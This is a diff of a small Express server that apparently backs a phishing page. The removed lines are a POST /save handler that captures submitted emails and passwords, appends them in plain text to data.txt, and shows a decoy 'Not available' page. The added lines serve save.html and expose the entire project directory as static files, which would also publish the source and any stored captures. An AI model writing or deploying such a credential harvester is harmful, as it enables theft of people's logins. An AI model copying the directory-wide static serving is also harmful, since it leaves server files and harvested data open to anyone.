@@ -1,16 +1,16 @@
 const express = require('express');
-const fs = require('fs');
-const bodyParser = require('body-parser');
+const path = require('path');
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 
-app.use(bodyParser.urlencoded({ extended: true }));
+// Serve static files (CSS, images, JS)
+app.use(express.static(path.join(__dirname)));
 
-app.post('/save', (req, res) => {
-    const { email, password } = req.body;
-    const data = `Email: ${email}, Password: ${password}\n`;
-    fs.appendFileSync('data.txt', data);
-    res.send('<h1>Not available </h1>');
+// Serve HTML file
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'save.html'));
 });
 
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+});
